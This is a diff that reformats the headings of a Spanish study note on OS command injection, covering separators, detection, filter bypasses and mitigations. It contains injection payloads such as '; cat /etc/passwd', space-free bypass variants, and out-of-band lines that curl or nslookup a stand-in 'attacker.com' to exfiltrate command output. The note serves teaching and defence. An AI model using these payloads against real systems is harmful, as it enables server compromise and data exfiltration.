@@ -1,10 +1,4 @@
----
-icon: folder-open
----
-
-# OS command injection
-
-## 🔍 ¿Qué es OS Command Injection?
+# 🔍 OS command injection
 
 **OS Command Injection** (inyección de comandos del sistema) es una vulnerabilidad que permite a un atacante ejecutar comandos arbitrarios en el sistema operativo del servidor.
 
@@ -12,7 +6,7 @@ Ocurre cuando una aplicación pasa input del usuario directamente a comandos del
 
 ***
 
-### ⚙️ Cómo funciona
+## ⚙️ Cómo funciona
 
 Cuando una aplicación ejecuta comandos del sistema:
 
@@ -36,9 +30,9 @@ El comando inyectado se ejecuta con los mismos privilegios que la aplicación.
 
 ***
 
-### 🔀 Separadores y encadenamiento de comandos
+## 🔀 Separadores y encadenamiento de comandos
 
-#### 🐧 Unix/Linux
+### 🐧 Unix/Linux
 
 * `;` → ejecuta ambos comandos
 * `|` → pipe
@@ -47,28 +41,28 @@ El comando inyectado se ejecuta con los mismos privilegios que la aplicación.
 * `&` → ejecución en background
 * `\n` → nueva línea
 
-#### 🪟 Windows
+### 🪟 Windows
 
 * `&` → separador
 * `&&` → AND
 * `|` → pipe
 * `||` → OR
 
-#### 🔗 Ambos
+### 🔗 Ambos
 
 * Backticks: `` `cmd` ``
 * `$()` → sustitución de comandos
 
 ***
 
-### 🎯 Tipos de command injection
+## 🎯 Tipos de command injection
 
-#### 📡 In-Band
+### In-Band
 
 * La salida se ve directamente
 * Ej: `; cat /etc/passwd`
 
-#### 🌫️ Blind
+### Blind
 
 No hay salida visible:
 
@@ -78,7 +72,7 @@ No hay salida visible:
 
 ***
 
-### 📍 Puntos comunes de inyección
+## 📍 Puntos comunes de inyección
 
 * Inputs de usuario
 * Parámetros GET/POST
@@ -89,28 +83,28 @@ No hay salida visible:
 
 ***
 
-### 🕵️ Técnicas de detección
+## 🕵️ Técnicas de detección
 
-#### ⏱️ Time-based
+### Time-based
 
 ```bash
 & ping -c 10 127.0.0.1 &
 ```
 
-#### 📁 Redirección
+### Redirección
 
 ```bash
 & whoami > /var/www/output.txt &
 ```
 
-#### 🌐 Out-of-band
+### Out-of-band
 
 ```bash
 & nslookup attacker.com &
 & curl http://attacker.com?data=$(whoami) &
 ```
 
-#### ❌ Error-based
+### Error-based
 
 ```bash
 & invalid_command 2>&1 &
@@ -118,7 +112,7 @@ No hay salida visible:
 
 ***
 
-### 💥 Impacto
+## 💥 Impacto
 
 * Compromiso total del servidor
 * Exfiltración de datos
@@ -130,9 +124,9 @@ No hay salida visible:
 
 ***
 
-### 🚪 Bypass de filtros
+## 🚪 Bypass de filtros
 
-#### 🔄 Técnicas comunes
+### Técnicas comunes
 
 * Variación de mayúsculas: `WhOaMi`
 * Sustitución de comandos: `` `whoami` `` o `$(whoami)`
@@ -168,7 +162,7 @@ cat</etc/passwd
 %0a
 ```
 
-#### 📌 Bypass según contexto
+### Bypass según contexto
 
 ➡️ **Sin espacios**
 
@@ -184,33 +178,33 @@ cat ${HOME:0:1}etc${HOME:0:1}passwd
 
 ***
 
-### 🛡️ Mitigación
+## 🛡️ Mitigación
 
-#### ✅ Validación de entrada
+### Validación de entrada
 
 * Whitelist de caracteres
 * Bloquear metacaracteres:
   * `; | & $ > < \` \n\`
 
-#### 🚫 Evitar ejecución de comandos
+### Evitar ejecución de comandos
 
 * Usar librerías nativas
 * Evitar shell
 
-#### 📍 Parametrización
+### Parametrización
 
 * Usar funciones seguras como `execve()`
 
-#### 🔒 Mínimo privilegio
+### Mínimo privilegio
 
 * Ejecutar con permisos limitados
 * Usar contenedores
 
-#### ✍️ Escape de salida
+### Escape de salida
 
 * Escapar argumentos correctamente
 
-#### 🛡️ Defensa en profundidad
+### Defensa en profundidad
 
 * WAF
 * Monitorización
@@ -218,7 +212,7 @@ cat ${HOME:0:1}etc${HOME:0:1}passwd
 
 ***
 
-### 📖 Ejemplos reales
+## 📖 Ejemplos reales
 
 * **Shellshock (CVE-2014-6271)**
 * **Log4Shell (CVE-2021-44228)**
